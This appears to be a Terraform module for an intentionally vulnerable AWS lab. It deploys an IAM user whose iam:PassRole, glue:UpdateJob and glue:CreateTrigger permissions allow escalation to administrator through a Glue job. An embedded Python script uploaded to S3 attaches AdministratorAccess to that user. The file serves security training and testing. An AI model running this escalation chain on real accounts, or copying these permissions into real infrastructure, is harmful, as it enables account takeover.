terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      configuration_aliases = [aws.prod]
    }
  }
}

# iam-passrole+glue-updatejob+glue-createtrigger privilege escalation scenario
#
# This scenario demonstrates how a user with iam:PassRole, glue:UpdateJob, and
# glue:CreateTrigger can update an existing Glue job to use a privileged role and
# malicious script, then trigger it to grant themselves administrative access.

# Resource naming convention: pl-prod-glue-006-to-admin-{resource-type}
# All resources use provider = aws.prod

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider = aws.prod
  name     = "pl-prod-glue-006-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-glue-006-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user_key" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# S3 bucket for Glue job scripts
resource "aws_s3_bucket" "script_bucket" {
  provider = aws.prod
  bucket   = "pl-glue-scripts-glue-006-${var.account_id}-${var.resource_suffix}"

  tags = {
    Name        = "pl-glue-scripts-glue-006-${var.account_id}-${var.resource_suffix}"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "glue-job-scripts"
  }
}

# Block public access to the script bucket
resource "aws_s3_bucket_public_access_block" "script_bucket_pab" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Upload the benign script to S3 (initial job configuration)
resource "aws_s3_object" "benign_script" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id
  key      = "benign_script.py"
  content  = "print('Benign job execution complete')"

  tags = {
    Name        = "benign-script"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "initial-job-script"
  }
}

# Upload the malicious attack script to S3
resource "aws_s3_object" "attack_script" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id
  key      = "escalation_script.py"
  content  = <<-EOT
import boto3

# This script grants admin access to the starting user
iam = boto3.client('iam')

try:
    iam.attach_user_policy(
        UserName='${aws_iam_user.starting_user.name}',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print("Successfully attached AdministratorAccess to ${aws_iam_user.starting_user.name}")
except Exception as e:
    print(f"Error: {e}")
EOT

  tags = {
    Name        = "escalation-script"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "attack-script"
  }
}

# Bucket policy granting read access to all principals in the account
resource "aws_s3_bucket_policy" "script_bucket_policy" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowAccountReadGetObject"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:GetObject"
        ]
        Resource = "${aws_s3_bucket.script_bucket.arn}/*"
      }
    ]
  })
}

# Initial non-privileged role for the Glue job
resource "aws_iam_role" "initial_role" {
  provider = aws.prod
  name     = "pl-prod-glue-006-to-admin-initial-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "glue.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-glue-006-to-admin-initial-role"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "initial-non-privileged-role"
  }
}

# Attach AWS Glue Service Role for Glue service permissions to initial role
resource "aws_iam_role_policy_attachment" "initial_role_glue_service" {
  provider   = aws.prod
  role       = aws_iam_role.initial_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole"
}

# Target admin role that will be passed to the Glue job during update
resource "aws_iam_role" "target_role" {
  provider = aws.prod
  name     = "pl-prod-glue-006-to-admin-target-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "glue.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-glue-006-to-admin-target-role"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "admin-target"
  }
}

# Attach AdministratorAccess to the target role
resource "aws_iam_role_policy_attachment" "target_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.target_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attach AWS Glue Service Role for Glue service permissions to target role
resource "aws_iam_role_policy_attachment" "target_role_glue_service" {
  provider   = aws.prod
  role       = aws_iam_role.target_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole"
}

# Pre-create the Glue job with the initial role and benign script
resource "aws_glue_job" "pre_created_job" {
  provider     = aws.prod
  name         = "pl-glue-006-to-admin-job"
  role_arn     = aws_iam_role.initial_role.arn
  glue_version = "4.0"
  max_capacity = 0.0625

  command {
    name            = "pythonshell"
    script_location = "s3://${aws_s3_bucket.script_bucket.id}/${aws_s3_object.benign_script.key}"
    python_version  = "3.9"
  }

  default_arguments = {
    "--job-language" = "python"
  }

  timeout = 5

  tags = {
    Name        = "pl-glue-006-to-admin-job"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-createtrigger"
    Purpose     = "pre-created-glue-job"
  }

  # Ensure the bucket policy and scripts exist before creating the job
  depends_on = [
    aws_s3_bucket_policy.script_bucket_policy,
    aws_s3_object.benign_script,
    aws_s3_object.attack_script
  ]
}

# Policy granting the starting user permissions to exploit this vulnerability
resource "aws_iam_user_policy" "starting_user_policy" {
  provider = aws.prod
  name     = "pl-prod-glue-006-to-admin-starting-user-policy"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "RequiredForExploitationPassRole"
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.target_role.arn
      },
      {
        Sid    = "RequiredForExploitationGlue"
        Effect = "Allow"
        Action = [
          "glue:UpdateJob",
          "glue:CreateTrigger"
        ]
        Resource = "*"
      },
      {
        Sid    = "HelpfulForDemoScript"
        Effect = "Allow"
        Action = [
          "glue:GetJob",
          "glue:GetTrigger",
          "glue:GetJobRun",
          "glue:GetJobRuns",
          "sts:GetCallerIdentity"
        ]
        Resource = "*"
      }
    ]
  })
}
